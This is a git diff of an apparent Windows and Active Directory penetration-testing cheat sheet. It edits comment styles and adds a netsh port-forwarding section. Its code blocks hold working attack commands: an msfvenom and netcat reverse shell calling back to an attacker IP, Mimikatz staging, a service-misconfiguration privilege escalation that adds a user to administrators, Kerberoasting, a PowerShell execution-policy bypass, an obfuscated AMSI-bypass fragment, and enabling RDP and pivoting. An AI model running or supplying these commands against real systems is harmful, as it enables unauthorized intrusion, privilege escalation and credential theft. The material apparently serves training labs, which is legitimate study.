@@ -43,11 +43,11 @@ msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > 
 **[+] Reverse shell using NetCat**
 
 ```powershell
-- In your Kali Linux machine:
+// In your Kali Linux machine:
 
 nc -lnvp 443
 
-- In the target's machine
+// In the target's machine
 
 nc.exe 192.168.13.37 443 -e cmd.exe
 ```
@@ -94,12 +94,12 @@ Copy-Item -Path Invoke-Mimikatz.ps1 -Destination C:\users\public\Invoke-Mimikatz
 **[+] Transfer files using rdesktop tool (Available in Kali Linux)**
 
 ```
-- In Kali linux
+// In Kali linux
 
 mkdir /home/hitman/shared
 rdesktop -f 192.168.50.48 -r disk:linux=/home/hitman/shared
 
-- Now in Windows's RDP
+// Now in Windows's RDP
 
 Go to Network Places -> Entire Network -> Microsoft Terminal Services -> tsclient
 and put your files there, you will find them in Kali too
@@ -111,7 +111,7 @@ Note: You can access the share \\tsclient directly too
 **[+] Transfer files using network shares (Powershell)**
 
 ```powershell
-- You need to make a public share in your student's VM or your Kali
+// You need to make a public share in your student's VM or your Kali
 
 Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsrvadmin\Desktop\Diagnostics\nc.exe'
 ```
@@ -151,6 +151,8 @@ PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
 **[+] Weak service permissions privilege escalation**
 
 ```powershell
+// For example "Victim" is your current username
+
 C:\Users\victim\Desktop>accesschk64 -uwcqv "victim" *
 
 Accesschk v6.14 - Reports effective permissions for securable objects
@@ -159,6 +161,8 @@ Sysinternals - www.sysinternals.com
 
 RW SNMPTRAP
         SERVICE_ALL_ACCESS
+
+// Check service
 
 C:\Users\victim\Desktop>sc qc SNMPTRAP
 
@@ -175,12 +179,16 @@ SERVICE_NAME: SNMPTRAP
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
 
+// Change the binary path to your reverse shell or command
+
 C:\Users\victim\Desktop>sc config SNMPTRAP binpath= "net localgroup administrators victim /add"
 [SC] ChangeServiceConfig SUCCESS
 
 C:\Users\victim\Desktop>sc config SNMPTRAP obj= ".\LocalSystem" password= ""
 
 [SC] ChangeServiceConfig SUCCESS
+
+// Stop and restart the service
 
 C:\Users\victim\Desktop>sc start SNMPTRAP
 ```
@@ -201,7 +209,6 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 
 ```powershell
 Add-Type -AssemblyName System.IdentityModel  
-
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
 ```
 
@@ -333,11 +340,11 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 **[+] Bypass Powershell Execution Policy**
 
 ```powershell
-In Powershell you can write:
+// In Powershell you can write:
 
 Set-ExecutionPolicy -ExecutionPolicy bypass
 
-or run powershell like this:
+// or run powershell like this:
 
 powershell.exe -ep bypass
 ```
@@ -387,8 +394,17 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 
 ```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+```
+
+&nbsp;
+
+
+**[+] Port forwarding**
+
+```powershell
+netsh interface portproxy add v4tov4 listenport=2525 listenaddress=192.168.50.48 connectport=25 connectaddress=192.168.21.55
+netsh advfirewall firewall add rule name=smtpfrwd dir=in action=allow protocol=TCP localport=2525
 ```
 
 &nbsp;
